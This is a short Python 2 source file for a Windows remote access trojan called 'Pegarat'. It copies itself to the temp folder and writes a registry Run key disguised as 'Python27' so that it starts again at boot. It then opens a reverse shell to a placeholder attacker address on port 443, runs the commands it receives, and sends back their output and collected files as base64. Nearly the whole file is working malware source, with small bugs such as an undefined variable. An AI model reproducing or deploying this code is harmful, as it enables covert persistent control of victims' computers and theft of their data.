#!/usr/bin/python
#
# Pegarat
#

import os
import time
import sys, base64, os, socket, subprocess
from _winreg import *
import librat

def autorun(tempdir, fileName, run):
	os.system('copy %s %s'%(fileName,tmpdir))
	key = OpenKey(HKEY_LOCAL_MACHINE,run)
	runkey = []
	try:
		i = 0
		while True:
			subkey = EnumValue(key,i)
			runkey.append(subkey[0])
			i += 1
	except WindowsError:
		pass

	if 'Python27' not in runkey:
		try:
			key = OpenKey(HKEY_LOCAL_MACHINE,run,0,KEY_ALL_ACCESS)
			SetValueEx(key,'Python27',0,REG_SZ,r"%TEMP%\ratool.exe")
			key.Close()
		except WindowsError:
			pass

def shell():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('attacker ip',int(443)))
	s.send('[*] Connection Established!')
	while 1:
		data = s.recv(512)
		if data == "quit": break
		proc = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		encoded = base64.b64encode(stdout_value)
		s.send(encoded)
		
		#Read files adn send them.
		encoded_files = base64.b64encode(librat.init_sys())
		s.send("Sending files... Prepare to receive!")
		s.send(encoded_files)
		s.close()

def main():
	tempdir = '%TEMP%'
	fileName = sys.argv[0]
	run = "Software\Microsoft\Windows\CurrentVersion\Run"
	autorun(tempdir,fileName,run)
	shell()

if __name__ == "__main__":
	main()

